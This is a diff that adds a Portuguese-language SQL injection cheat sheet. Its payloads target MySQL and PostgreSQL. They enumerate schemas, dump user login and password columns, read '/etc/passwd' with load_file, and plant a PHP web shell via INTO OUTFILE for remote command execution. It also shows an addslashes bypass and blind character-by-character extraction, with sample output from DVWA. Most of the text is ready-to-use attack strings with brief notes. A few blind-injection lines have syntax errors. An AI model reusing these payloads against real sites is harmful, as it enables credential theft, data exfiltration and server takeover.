@@ -1,0 +1,257 @@
+
+==============================SqlInjection Comandos MySql==============================================================================================
+' coloca uma aspas simples no final do site para ver o que vai ser retornado se retotna um erro sql o site est[a vulneravela consulta tem 5 campos 
+ 
+' union select 1,2,3,4,5%23 --->a consulta tem 5 campos  tem que parar antes de retorna um erro as vezes no final pode colocar ; em vez de %23 e tambem '  
+
+php?loja=sbc' union select 1,2,version(),user(),database()' ---> mostrar a vers'ao o usuario e a database
+
+' union select 1,2,table_name,4,5 from information_schema.tables%23 ---> retorna todos os nomes  tabelas dentro de information_schema
+
+' union select 1,2,table_name,4,5 from information_schema.tables where table_schema="dbmrtur"%23 --> mostra todas as tabelas do bando de dados filtrado dbmrtur
+
+' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema="dbmrtur"%23 --> agrupa as tabelas na horizontal
+
+' union select 1,2,column_name,4,5 from information_schema.columns where table_schema="dbmrtur"%23 --> mostra todos os nomes da coluna do bando de dados filtrado dbmrtur
+ 
+' union select 1,2,column_name,4,5 from information_schema.columns where table_schema="dbmrtur" and table_name="mrusers"%23 --> mostra todos os nomes da 
+coluna do bando de dados filtrado do bando de dados e mostra a tabela especifica do bando de dados>
+
+' union select 1,2,nome,login,senha from mrusers %23 --> consulta os dados na tabela mrusers
+
+' union select 1,2,nome,concat(login,':',senha),4,5 from mrusers %23 --> consulta os dados na tabela mrusers
+
+' union select 1,2,nome,concat(id,'Login=',login,'Senha=',senha),4,5 from mrusers %23 --> consulta os dados na tabela mrusers
+
+================Observacao quando na url final for id n'ao precisa usar aspas
+
+do sql ao rce
+
+' union select 1,2,3,4,load_file("/etc/passwd")%23  ----> carrega arquivos do sistema operacional direto na tela
+
+================================================ remote code sqlinjection=========================================================================
+' union select 1,2,3,4,"<?php system($_GET['ricsec']);?>" INTO OUTFILE "/var/www/html/turismo/banners/rce.php"%23 ---> tem que ter permisao de escrita
+
+
+174.16.1.0/turismo/banners/rce.php?ricsec=id --> pode mandar comandos tipo ls id pwd cd  
+
+===================================================================================================================================================
+
+=====================================================BYPASS ADDSLASHES============================================================================
+
+tem que converter a string em decimal ┌──(root㉿kali)-[/home/kali]
+└─# echo -n "ricsec" | od -An -tdC
+  114  105   99  115  101   99 ------> exemplo mostra o char em decimal
+
+union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(100,98,109,114,116,117,114)
+
+union select 1,column_name,3,4,5from information_schema.columns where table_schema=char(100,98,109,114,116,117,114)and table_name=char(100,98,109,114,117,115,101,114,115)
+
+depois que conseguir dar o bypass
+
+union select 1,login,senha,4,5 from mrusers
+========================================================================================================================================================
+
+
+================================================SQL injection postgreSql=================================================================================
+
+
+pg_query() se retornar esse warning o banco de dados e postgresql
+
+
+?id=1 order by 4 --> vai tentando do 1 ate char o erro no numero que chamar o erro vc volta 1 no  valor
+
+pode ser tbm
+
+?id=1 union select null,null,null,null --->  a consulta deve ter o mesmo numero de coluna 
+ 
+=============obs quando quer omitir a informa;'ao n'ao relevante botar o menos -1 exemplo abaixo=====================
+?id=-1 union select null,'ricsec',null,null ---> exibi a instring onde pode receber valores
+
+
+?id=-1 union select null,version(),null,null  ---> mostra a versao do postgre 
+
+
+?id=-1 union select null,current_database(),null,null -------> exibe a database atual 
+
+
+?id=-1 union select null,current_user,null,null  ---------> exibe usuario
+
+
+?id=-1 union select null,table_name,null,null from information_schema.tables ----------> exibe todas as tabelas
+
+
+?id=-1 union select null,table_name,null,null from information_schema.tables where table_catalog='photoblog'
+
+
+?id=-1 union select null,column_name,null,null from information_schema.columns where table_catalog='photoblog' and table_name='users'
+
+?id=-1 union select null,login,null,null from users
+
+
+?id=-1 union select null,password,null,null from users 
+
+?id=-1 union select null,login||password,null,null from users --------> concatena os dados
+
+?id=-1 union select null,login||':'||password,null,null from users --------> concatena e delimitador
+
+==========================================sql injection blind =============================================
+
+se colocar uma condicao verdadeira e no campo de input e retornar algo a pagina e vulneravel
+
+ID: 2=2 and 2=2#           <------------- exemplo usado no dvwa
+First name: Gordon
+Surname: Brown 
+
+
+
+ID: ' or true#  <-------------------- exemplo usado no dvwa
+First name: admin
+Surname: admin
+
+ID: ' or true#
+First name: Gordon
+Surname: Brown
+
+ID: ' or true#
+First name: Hack
+Surname: Me
+
+ID: ' or true#
+First name: Pablo
+Surname: Picasso
+
+ID: ' or true#
+First name: Bob
+Surname: Smith
+
+
+ID: ' or 2=2 union select 1,2# <----------- exemplo usado no dvwa
+First name: admin
+Surname: admin
+
+ID: ' or 2=2 union select 1,2#
+First name: Gordon
+Surname: Brown
+
+ID: ' or 2=2 union select 1,2#
+First name: Hack
+Surname: Me
+
+ID: ' or 2=2 union select 1,2#
+First name: Pablo
+Surname: Picasso
+
+ID: ' or 2=2 union select 1,2#
+First name: Bob
+Surname: Smith
+
+ID: ' or 2=2 union select 1,2#
+First name: 1
+Surname: 2
+
+
+
+  
+ID: ' or 2=2 union select 1,user()#  <-------- exemplo usado no dvwa
+First name: admin
+Surname: admin
+
+ID: ' or 2=2 union select 1,user()#
+First name: Gordon
+Surname: Brown
+
+ID: ' or 2=2 union select 1,user()#
+First name: Hack
+Surname: Me
+
+ID: ' or 2=2 union select 1,user()#
+First name: Pablo
+Surname: Picasso
+
+ID: ' or 2=2 union select 1,user()#
+First name: Bob
+Surname: Smith
+
+ID: ' or 2=2 union select 1,user()#
+First name: 1
+Surname: root@localhost
+
+ 
+
+
+ID: ' or 2=2 union select 1,database()#  <--------- exemplo usado no dvwa
+First name: admin
+Surname: admin
+
+ID: ' or 2=2 union select 1,database()#
+First name: Gordon
+Surname: Brown
+
+ID: ' or 2=2 union select 1,database()#
+First name: Hack
+Surname: Me
+
+ID: ' or 2=2 union select 1,database()#
+First name: Pablo
+Surname: Picasso
+
+ID: ' or 2=2 union select 1,database()#
+First name: Bob
+Surname: Smith
+
+ID: ' or 2=2 union select 1,database()#
+First name: 1
+Surname: dvwa
+
+
+
+exemplo ricardo' and length(database()) = 7 # pergunta ao servidor a quantidade de caracteres tem o nome da database
+
+
+exemplo ricardo' and ascii(substring(database(),1,1)) = 100#  ---->  e verdade que aprimeira letra do database
+ e d tem que perguntar ao  servidor letra por letra em decimal  100 e d em decimal
+
+
+ricardo' and ascii(substring(database(),2,1)) = 98#    
+
+ricardo' and ascii(substring(database(),3,1)) = 109#
+
+ricardo' and ascii(substring(database(),4,1)) = 114#
+
+ricardo' and ascii(substring(database(),5,1)) = 116#
+
+ricardo' and ascii(substring(database(),6,1)) = 117#
+
+ricardo' and ascii(substring(database(),7,1)) = 114#
+
+exemplo dbmrtur 100.98,109,114,116,117,114 ---> nome do database em hexadecimal
+
+
+
+ricardo' and (select length(group_concat(table_name)) = 35 from information_schema.tables where table_schema="dbmrtur"# 
+perguntando ao servidor a quantidades de todos os caracters de todas as tabelas juntas 
+
+ricardo' and ascii (substring(select group_concat(table_name) from information_schema.tables where table_schema="dbmrtur"),1,1)) = 97# 
+perguntando a primeira letra da tabela 
+
+97 100 109 44 = adm , 
+
+
+ricardo' and ascii (substring(select group_concat(column_name) from information_schema.columnss where table_schema="dbmrtur" and table_name="adm"),1,1)) = 105#
+perguntando a primeira letra da coluna 
+
+105 100 = id
+
+ricardo' and ascii (substring(select login from adm limit 0,1),1,1)) = 97#
+perguntando a primeira do dado  registrado em login
+
+login = admin
+
+
+
+
+
+ 
+
+
